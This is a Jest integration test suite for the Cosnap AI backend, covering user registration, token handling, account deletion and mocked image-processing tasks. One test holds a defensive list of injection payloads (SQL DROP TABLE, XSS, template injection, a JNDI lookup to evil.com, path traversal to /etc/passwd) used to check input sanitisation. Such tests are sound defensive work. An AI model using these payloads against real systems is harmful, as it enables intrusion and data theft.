/**
 * Integration tests for the complete Cosnap AI API
 * 
 * Tests complete user journeys including:
 * - User registration and authentication flow
 * - AI effects processing workflow
 * - Account management operations
 * - Cross-service interactions
 * - Database consistency checks
 */

import { describe, test, expect, beforeAll, afterAll, beforeEach, afterEach } from '@jest/globals';
import request from 'supertest';
import { PrismaClient } from '@prisma/client';
import express from 'express';
import cors from 'cors';

// Import all routes
import authRouter from '../../src/routes/auth.js';
import effectsRouter from '../../src/routes/effects.js';
import healthRouter from '../../src/routes/health.js';

// Mock external services
jest.mock('../../src/services/uploadImageService.js');
jest.mock('../../src/services/comfyUITaskService.js');
jest.mock('../../src/services/webappTaskService.js');
jest.mock('../../src/services/emailService.js');

import { uploadImageService } from '../../src/services/uploadImageService.js';
import { startComfyUITaskService, getComfyUITaskStatus, getComfyUITaskResult } from '../../src/services/comfyUITaskService.js';
import { isEmailEnabled } from '../../src/services/emailService.js';
import { mockFileUpload } from '../setup.js';

// Create test app that mimics production setup
const app = express();
app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

// Mount routes
app.use('/api/auth', authRouter);
app.use('/api/effects', effectsRouter);
app.use('/api/health', healthRouter);

// Global error handler
app.use((error, req, res, next) => {
  console.error('Test app error:', error);
  res.status(500).json({ success: false, error: error.message });
});

describe('API Integration Tests', () => {
  let prisma;
  let testUser = null;
  let accessToken = null;
  let refreshToken = null;

  beforeAll(async () => {
    prisma = new PrismaClient({
      datasources: {
        db: {
          url: process.env.DATABASE_URL
        }
      }
    });

    await prisma.$connect();
    
    // Mock external services
    isEmailEnabled.mockResolvedValue(false); // Disable email in tests
    uploadImageService.mockResolvedValue('test-uploaded-image.jpg');
    startComfyUITaskService.mockResolvedValue({ taskId: 'integration-test-task-123' });
    getComfyUITaskStatus.mockResolvedValue('SUCCESS');
    getComfyUITaskResult.mockResolvedValue(['https://example.com/result.jpg']);
  });

  afterAll(async () => {
    if (prisma) {
      await prisma.$disconnect();
    }
  });

  beforeEach(async () => {
    // Clean database before each test
    await prisma.refreshToken.deleteMany();
    await prisma.verificationCode.deleteMany();
    await prisma.user.deleteMany();
    
    // Reset variables
    testUser = null;
    accessToken = null;
    refreshToken = null;
  });

  describe('Complete User Journey', () => {
    test('should complete full user registration, login, and AI processing workflow', async () => {
      // Step 1: Check availability
      let response = await request(app)
        .get('/api/auth/check-availability')
        .query({ email: 'integration@test.com', username: 'integrationuser' });

      expect(response.status).toBe(200);
      expect(response.body.success).toBe(true);
      expect(response.body.emailAvailable).toBe(true);
      expect(response.body.usernameAvailable).toBe(true);

      // Step 2: Register new user
      response = await request(app)
        .post('/api/auth/register')
        .send({
          email: 'integration@test.com',
          username: 'integrationuser',
          password: 'TestPassword123!'
        });

      expect(response.status).toBe(201);
      expect(response.body.success).toBe(true);
      expect(response.body.user).toBeDefined();
      expect(response.body.accessToken).toBeDefined();
      expect(response.body.refreshToken).toBeDefined();

      accessToken = response.body.accessToken;
      refreshToken = response.body.refreshToken;
      testUser = response.body.user;

      // Step 3: Verify user info endpoint
      response = await request(app)
        .get('/api/auth/me')
        .set('Authorization', `Bearer ${accessToken}`);

      expect(response.status).toBe(200);
      expect(response.body.success).toBe(true);
      expect(response.body.user.email).toBe('integration@test.com');
      expect(response.body.user.username).toBe('integrationuser');

      // Step 4: Create AI processing task
      const mockFile = mockFileUpload.createMockFile('test.jpg', 'image/jpeg');
      const nodeInfoList = JSON.stringify([
        { nodeId: "39", fieldName: "image" },
        { nodeId: "52", fieldName: "text", paramKey: "prompt" }
      ]);

      response = await request(app)
        .post('/api/effects/comfyui/apply')
        .set('Authorization', `Bearer ${accessToken}`)
        .field('workflowId', '1937084629516193794')
        .field('nodeInfoList', nodeInfoList)
        .field('prompt', 'beautiful sunset landscape')
        .attach('images', mockFile.buffer, mockFile.originalname);

      expect(response.status).toBe(200);
      expect(response.body.success).toBe(true);
      expect(response.body.taskId).toBeDefined();
      expect(response.body.taskType).toBe('ComfyUI');

      const taskId = response.body.taskId;

      // Step 5: Check task status
      response = await request(app)
        .post('/api/effects/comfyui/status')
        .set('Authorization', `Bearer ${accessToken}`)
        .send({ taskId: taskId, regionId: 'hongkong' });

      expect(response.status).toBe(200);
      expect(response.body.success).toBe(true);
      expect(response.body.status).toBe('SUCCESS');

      // Step 6: Get task results
      response = await request(app)
        .post('/api/effects/comfyui/results')
        .set('Authorization', `Bearer ${accessToken}`)
        .send({ taskId: taskId });

      expect(response.status).toBe(200);
      expect(response.body.success).toBe(true);
      expect(response.body.results).toEqual(['https://example.com/result.jpg']);

      // Step 7: Update user profile
      response = await request(app)
        .put('/api/auth/me')
        .set('Authorization', `Bearer ${accessToken}`)
        .send({
          bio: 'AI art enthusiast',
          username: 'updateduser'
        });

      expect(response.status).toBe(200);
      expect(response.body.success).toBe(true);
      expect(response.body.user.bio).toBe('AI art enthusiast');
      expect(response.body.user.username).toBe('updateduser');

      // Step 8: Refresh token
      response = await request(app)
        .post('/api/auth/refresh')
        .send({ refreshToken: refreshToken });

      expect(response.status).toBe(200);
      expect(response.body.success).toBe(true);
      expect(response.body.accessToken).toBeDefined();

      const newAccessToken = response.body.accessToken;

      // Step 9: Verify new token works
      response = await request(app)
        .get('/api/auth/me')
        .set('Authorization', `Bearer ${newAccessToken}`);

      expect(response.status).toBe(200);
      expect(response.body.success).toBe(true);

      // Step 10: Logout
      response = await request(app)
        .post('/api/auth/logout')
        .send({ refreshToken: refreshToken });

      expect(response.status).toBe(200);
      expect(response.body.success).toBe(true);

      // Verify database state
      const userInDb = await prisma.user.findUnique({
        where: { id: testUser.id }
      });
      expect(userInDb).toBeDefined();
      expect(userInDb.username).toBe('updateduser');
      expect(userInDb.bio).toBe('AI art enthusiast');

      const tokenInDb = await prisma.refreshToken.findUnique({
        where: { token: refreshToken }
      });
      expect(tokenInDb.isRevoked).toBe(true);
    });

    test('should handle account deletion workflow', async () => {
      // Register user
      let response = await request(app)
        .post('/api/auth/register')
        .send({
          email: 'deletion@test.com',
          username: 'deletionuser',
          password: 'TestPassword123!'
        });

      expect(response.status).toBe(201);
      accessToken = response.body.accessToken;
      refreshToken = response.body.refreshToken;
      testUser = response.body.user;

      // Create some data for the user
      response = await request(app)
        .put('/api/auth/me')
        .set('Authorization', `Bearer ${accessToken}`)
        .send({
          bio: 'This user will be deleted',
          avatar: 'https://example.com/avatar.jpg'
        });

      expect(response.status).toBe(200);

      // Delete account
      response = await request(app)
        .delete('/api/auth/me/account')
        .set('Authorization', `Bearer ${accessToken}`)
        .send({
          password: 'TestPassword123!',
          confirmationText: 'DELETE MY ACCOUNT'
        });

      expect(response.status).toBe(200);
      expect(response.body.success).toBe(true);
      expect(response.body.message).toContain('账户已成功删除');

      // Verify user is anonymized
      const deletedUser = await prisma.user.findUnique({
        where: { id: testUser.id }
      });
      
      expect(deletedUser).toBeDefined();
      expect(deletedUser.email).toContain('deleted_');
      expect(deletedUser.username).toContain('deleted_user_');
      expect(deletedUser.passwordHash).toBe('DELETED_ACCOUNT');
      expect(deletedUser.bio).toBe(null);
      expect(deletedUser.avatar).toBe(null);
      expect(deletedUser.isActive).toBe(false);

      // Verify refresh tokens are deleted
      const tokens = await prisma.refreshToken.findMany({
        where: { userId: testUser.id }
      });
      expect(tokens).toHaveLength(0);
    });
  });

  describe('Error Handling and Edge Cases', () => {
    beforeEach(async () => {
      // Create test user for error scenarios
      const response = await request(app)
        .post('/api/auth/register')
        .send({
          email: 'error@test.com',
          username: 'erroruser',
          password: 'TestPassword123!'
        });
      
      accessToken = response.body.accessToken;
      refreshToken = response.body.refreshToken;
      testUser = response.body.user;
    });

    test('should handle malformed requests gracefully', async () => {
      // Malformed JSON
      const response = await request(app)
        .post('/api/auth/login')
        .type('json')
        .send('{"invalid": json}');

      expect(response.status).toBe(400);
    });

    test('should handle database connection errors', async () => {
      // Temporarily disconnect database
      await prisma.$disconnect();

      const response = await request(app)
        .get('/api/auth/me')
        .set('Authorization', `Bearer ${accessToken}`);

      expect(response.status).toBe(500);

      // Reconnect database
      await prisma.$connect();
    });

    test('should handle concurrent requests safely', async () => {
      // Create multiple concurrent profile update requests
      const promises = Array.from({ length: 5 }, (_, i) => 
        request(app)
          .put('/api/auth/me')
          .set('Authorization', `Bearer ${accessToken}`)
          .send({ bio: `Concurrent update ${i}` })
      );

      const responses = await Promise.all(promises);
      
      // At least one should succeed
      const successfulResponses = responses.filter(r => r.status === 200);
      expect(successfulResponses.length).toBeGreaterThan(0);

      // All should have valid responses
      responses.forEach(response => {
        expect([200, 409, 500]).toContain(response.status);
      });
    });

    test('should validate against injection attacks', async () => {
      const injectionPayloads = [
        "'; DROP TABLE users; --",
        "<script>alert('xss')</script>",
        "{{ 7*7 }}",
        "${jndi:ldap://evil.com/x}",
        "../../../etc/passwd"
      ];

      for (const payload of injectionPayloads) {
        const response = await request(app)
          .put('/api/auth/me')
          .set('Authorization', `Bearer ${accessToken}`)
          .send({ bio: payload });

        // Should either succeed with sanitized input or reject
        expect([200, 400]).toContain(response.status);
        
        if (response.status === 200) {
          // If accepted, should be sanitized
          expect(response.body.user.bio).not.toBe(payload);
        }
      }
    });

    test('should handle file upload edge cases', async () => {
      const edgeCases = [
        // Empty file
        { buffer: Buffer.alloc(0), name: 'empty.jpg' },
        // Very small file
        { buffer: Buffer.alloc(1), name: 'tiny.jpg' },
        // File with special characters in name
        { buffer: Buffer.alloc(100), name: 'file with spaces & symbols!.jpg' }
      ];

      for (const testCase of edgeCases) {
        const response = await request(app)
          .post('/api/effects/comfyui/apply')
          .set('Authorization', `Bearer ${accessToken}`)
          .field('workflowId', '123')
          .field('nodeInfoList', '[{"nodeId":"39","fieldName":"image"}]')
          .attach('images', testCase.buffer, testCase.name);

        // Should handle gracefully (either success or proper error)
        expect([200, 400, 413, 500]).toContain(response.status);
      }
    });

    test('should enforce rate limits', async () => {
      // Make rapid requests to test rate limiting
      const rapidRequests = Array.from({ length: 20 }, () => 
        request(app)
          .post('/api/auth/refresh')
          .send({ refreshToken: refreshToken })
      );

      const responses = await Promise.all(rapidRequests);
      
      // Some requests should be rate limited
      const rateLimitedResponses = responses.filter(r => r.status === 429);
      expect(rateLimitedResponses.length).toBeGreaterThan(0);
    });
  });

  describe('Cross-Service Integration', () => {
    beforeEach(async () => {
      const response = await request(app)
        .post('/api/auth/register')
        .send({
          email: 'cross@test.com',
          username: 'crossuser',
          password: 'TestPassword123!'
        });
      
      accessToken = response.body.accessToken;
      testUser = response.body.user;
    });

    test('should maintain session across different endpoints', async () => {
      // Use same token across different services
      const endpoints = [
        { method: 'get', path: '/api/auth/me' },
        { method: 'post', path: '/api/effects/comfyui/status', body: { taskId: 'test' } },
        { method: 'post', path: '/api/effects/upload/presign', body: { ext: 'jpg' } }
      ];

      for (const endpoint of endpoints) {
        const response = await request(app)
          [endpoint.method](endpoint.path)
          .set('Authorization', `Bearer ${accessToken}`)
          .send(endpoint.body || {});

        // All should recognize the same user
        if (response.status === 200) {
          expect(response.body.success).toBe(true);
        } else {
          // Should be validation error, not auth error
          expect(response.status).not.toBe(401);
        }
      }
    });

    test('should handle service dependencies correctly', async () => {
      // Test when upload service fails
      uploadImageService.mockRejectedValueOnce(new Error('Upload service down'));

      const mockFile = mockFileUpload.createMockFile('test.jpg', 'image/jpeg');
      
      const response = await request(app)
        .post('/api/effects/comfyui/apply')
        .set('Authorization', `Bearer ${accessToken}`)
        .field('workflowId', '123')
        .field('nodeInfoList', '[{"nodeId":"39","fieldName":"image"}]')
        .attach('images', mockFile.buffer, mockFile.originalname);

      expect(response.status).toBe(500);
      expect(response.body.error).toContain('图片上传失败');
    });
  });

  describe('Data Consistency Checks', () => {
    test('should maintain referential integrity on user operations', async () => {
      // Register user
      let response = await request(app)
        .post('/api/auth/register')
        .send({
          email: 'integrity@test.com',
          username: 'integrityuser', 
          password: 'TestPassword123!'
        });

      const userId = response.body.user.id;
      const refreshToken = response.body.refreshToken;

      // Verify user and token exist
      const user = await prisma.user.findUnique({ where: { id: userId } });
      const token = await prisma.refreshToken.findUnique({ where: { token: refreshToken } });
      
      expect(user).toBeDefined();
      expect(token).toBeDefined();
      expect(token.userId).toBe(userId);

      // Logout (revoke token)
      response = await request(app)
        .post('/api/auth/logout')
        .send({ refreshToken: refreshToken });

      expect(response.status).toBe(200);

      // Verify token is revoked but user still exists
      const userAfter = await prisma.user.findUnique({ where: { id: userId } });
      const tokenAfter = await prisma.refreshToken.findUnique({ where: { token: refreshToken } });
      
      expect(userAfter).toBeDefined();
      expect(tokenAfter.isRevoked).toBe(true);
    });

    test('should handle database transactions correctly', async () => {
      // Test account deletion transaction
      const response = await request(app)
        .post('/api/auth/register')
        .send({
          email: 'transaction@test.com',
          username: 'transactionuser',
          password: 'TestPassword123!'
        });

      const userId = response.body.user.id;
      const accessToken = response.body.accessToken;

      // Create additional data
      await prisma.verificationCode.create({
        data: {
          email: 'transaction@test.com',
          code: '123456',
          scene: 'test',
          expiresAt: new Date(Date.now() + 10 * 60 * 1000)
        }
      });

      // Count records before deletion
      const usersBefore = await prisma.user.count();
      const tokensBefore = await prisma.refreshToken.count(); 
      const codesBefore = await prisma.verificationCode.count();

      // Delete account
      await request(app)
        .delete('/api/auth/me/account')
        .set('Authorization', `Bearer ${accessToken}`)
        .send({
          password: 'TestPassword123!',
          confirmationText: 'DELETE MY ACCOUNT'
        });

      // Verify transaction completed properly
      const usersAfter = await prisma.user.count();
      const tokensAfter = await prisma.refreshToken.count();
      const codesAfter = await prisma.verificationCode.count();

      expect(usersAfter).toBe(usersBefore); // User anonymized, not deleted
      expect(tokensAfter).toBe(tokensBefore - 1); // Token deleted
      expect(codesAfter).toBe(codesBefore - 1); // Verification codes deleted
    });
  });

  describe('Health and Monitoring', () => {
    test('should respond to health check', async () => {
      const response = await request(app)
        .get('/api/health');

      expect(response.status).toBe(200);
      expect(response.body.status).toBe('healthy');
    });

    test('should include database connectivity in health check', async () => {
      const response = await request(app)
        .get('/api/health');

      expect(response.status).toBe(200);
      expect(response.body).toHaveProperty('database');
    });
  });
});